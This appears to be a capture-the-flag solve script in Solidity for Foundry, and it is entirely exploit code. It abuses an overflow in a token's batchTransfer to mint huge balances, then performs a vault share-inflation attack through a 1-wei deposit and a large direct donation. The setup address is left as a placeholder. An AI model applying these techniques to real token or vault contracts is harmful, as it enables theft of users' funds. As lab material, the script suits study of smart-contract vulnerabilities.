//SPDX-License-Identifier:MIT
pragma solidity ^0.8.20;

import {Script,console} from "forge-std/Script.sol";
import {Setup,Stake,INR} from "src/Setup.sol";

contract solve is Script{
     using stdJson for *;
    function run()public{
        Setup setup=Setup(/**/YOUR INSTANCE SETUP ADDRESS */);
        Stake stake;
        INR inr;
        
        vm.startBroadcast();
        ExploitInflation exploit=new ExploitInflation(setup);
        exploit.Exploit();
        vm.stopBroadcast();

    }
}   


contract ExploitInflation{
    Stake stake;
    INR inr;
    Setup setup;

    constructor(Setup _setup){
        setup=_setup;
        inr=setup.inr();
        stake=setup.stake();
    }

    function Exploit()public{
        setup.claim();
        uint256 stakeAmount=1;
        uint256 inflationAmount=50_000 ether;
        address[] memory Receivers=new address[](2);
        Receivers[0]=address(this);
        Receivers[1]=address(0);
        uint256 amount=((type(uint256).max)/2)+1;
        inr.batchTransfer(Receivers, amount);
        inr.approve(address(stake), stakeAmount);
        stake.deposit(stakeAmount, address(this));
        inr.transfer(address(stake), inflationAmount);
        setup.stakeINR();
        setup.solve();
        require(setup.isSolved(),"Exploit Failed");
        console.log(setup.isSolved());
    }
}